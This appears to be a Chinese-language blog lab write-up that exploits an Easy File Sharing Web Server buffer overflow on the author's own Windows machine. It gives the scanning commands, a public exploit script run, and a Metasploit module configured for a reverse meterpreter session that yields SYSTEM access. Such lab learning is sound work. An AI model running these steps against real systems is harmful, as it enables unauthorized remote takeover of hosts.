---
layout: post
title: "EFSS 缓冲区溢出：从扫描到拿到会话"
date: 2026-11-10
categories: 实验
---

Easy File Sharing Web Server（下面简称 EFSS）是装在 Windows 上的一个文件共享服务，会在 80 端口开一个网页，用浏览器就能上传下载文件。它在处理网址路径时不检查长度，路径太长就会把内存写坏，这叫缓冲区溢出。

这个漏洞我用两种方法各做一遍：先扫一遍端口、找一个公开脚本，效果是靶机上弹出计算器；再用 Metasploit 打同一个漏洞，效果是拿到一个能敲命令的会话。攻击机是 Kali 虚拟机，靶机是本机的 Windows。

## 准备工作

先确认两边的地址：Windows 上用 `ipconfig` 看 IPv4，Kali 上用 `ip a`。我这里是靶机 `192.168.5.6`，Kali `192.168.200.131`。换了 WiFi 靶机地址会变，每次开始前都要重新看一眼。

1. **看服务在不在**

```
curl -I http://192.168.5.6/
```

`-I` 是只要响应头，不下载网页，返回很快。看到 `200 OK` 说明服务活着，`Server` 那行还会直接写出产品名和版本。

![图1](漏洞扫描/01.png)

*图1：返回 200，Server 写着 Easy File Sharing Web Server v6.9。*

2. **扫端口**

```
nmap -sT -sV -p 80 192.168.5.6
```

`-sV` 探服务版本，`-sT` 用完整 TCP 连接。结果里 80 是 open，服务是 http，系统是 Windows。

![图2](漏洞扫描/02.png)

*图2：80 端口开放。*

再把全部端口扫一遍，看这台机器还开着什么：

```
nmap -sT -p- 192.168.5.6
```

除了 80，还有 135、139、445，这几个是 Windows 的 RPC 和 SMB，说明这是一台完整的 Windows 主机。

![图3](漏洞扫描/03.png)

*图3：全端口扫描，Windows 常见端口都在。*

3. **nmap 报 filtered 的时候**

有时候 80 会被测成 `filtered`，看上去像被防火墙挡了。但我用 `curl -I` 能访问，说明端口是开的。

原因是这个服务单线程，一次只能处理一个连接。nmap 探版本时会连着发好几个连接，后面的被丢掉，收不到回应就判成 filtered。换成 `-sT` 一条一条连，或者用 `curl -I` 单独验证一次。

4. **找对应的漏洞脚本**

```
searchsploit Easy File Sharing
```

会返回一大串，挑版本号对得上的。路径前面是编号，后面是脚本在漏洞库里的位置。

![图4](漏洞扫描/04.png)

*图4：搜索结果，编号和脚本路径。*

带 `Remote` 的能远程打，带 `SEH` 的说明利用的是异常处理，带 `DoS` 的只能把服务打崩。

这里有个坑：`Server` 那行写的是 6.9，可漏洞库里全是 7.2 的。去看靶机上 `fsws.exe` 的文件属性，版本是 `7.2.0.0`，安装包叫 `efssetup_20181.exe`。程序换了版本，但 HTTP 头里那句话厂商一直没改，所以判断版本要以文件为准。

---

# 实验一：用公开脚本打，弹出计算器

1. **把脚本拷过来**

```
searchsploit -m windows/remote/39008.py
```

`-m` 是把这个脚本复制到当前目录，省得自己去漏洞库目录里翻。

2. **运行脚本**

```
python2 39008.py 192.168.5.6 80
```

两个参数是靶机地址和端口。必须用 `python2`，这个脚本是 2010 年写的，用 python3 会报 `Missing parentheses in call to 'print'`，因为 `print` 和 `httplib` 都是 Python2 的写法。

3. **靶机上弹出计算器**

脚本跑完终端打印 `Done...`，然后靶机桌面上弹出计算器。

![图5](漏洞扫描/05.png)

*图5：脚本执行完，靶机上弹出计算器。*

计算器是靶机上真跑起来的程序。它能弹出来，说明发过去的字节在靶机上变成了指令。选它是因为无害又看得见，换成别的代码，弹出来的就是别的程序。

# 实验二：用 Metasploit 再做一遍

同一个漏洞、同一个端口，只是换成 Metasploit 里的现成模块。它的好处是打完会顺手建一个会话，可以一直在里面敲命令。

1. **启动并加载模块**

```
msfconsole
search EasyFileSharing
use exploit/windows/http/easyfilesharing_seh
```

![图6](漏洞扫描/06.png)

*图6：启动 msfconsole。*

搜出来两条，选 SEH 那条，和 39008 是同一个漏洞。

![图7](漏洞扫描/07.png)

*图7：两个模块，下面是它们的路径。*

2. **填参数**

```
set RHOSTS 192.168.5.6
set LHOST 192.168.200.131
set LPORT 4444
```

![图8](漏洞扫描/08.png)

*图8：模块加载完成。*

`RHOSTS` 是靶机地址。`LHOST` 是让靶机回连到哪，所以必须填 Kali 自己的地址。

![图9](漏洞扫描/09.png)

*图9：三个参数，RHOSTS 是靶机，LHOST 是本机。*

这里很容易填错。`LHOST` 填成靶机地址，执行时报 `Handler failed to bind to 192.168.5.6:4444`。`bind` 是在本地开端口监听，填别人的地址等于让本机去绑一个不属于自己的地址，结果就会绑不上。

![图10](漏洞扫描/10.png)

*图10：填成靶机地址，绑不上。*

3. **exploit**

```
exploit
```

![图11](漏洞扫描/11.png)

*图11：会话建立，出现 meterpreter 提示符。*

出现 `meterpreter >` 就说明拿到了控制权，后面敲的命令都在靶机上执行。敲 `getuid` 返回 `NT AUTHORITY\SYSTEM`，是 Windows 上权限最高的账户。

---

## 常用命令

- `curl -I 地址`：只看响应头，判断服务活不活
- `nmap -sT -sV -p 80`：单线程服务要用 `-sT`
- `nmap -sT -p-`：扫全部端口
- `searchsploit 关键词`：在漏洞库里按产品名搜
- `searchsploit -m 脚本路径`：把脚本拷到当前目录
- `python2 39008.py 靶机IP 端口`：实验一，执行攻击
- `use exploit/windows/http/easyfilesharing_seh`：实验二对应的模块
- `set RHOSTS / LHOST / LPORT`：靶机地址、本机地址、监听端口
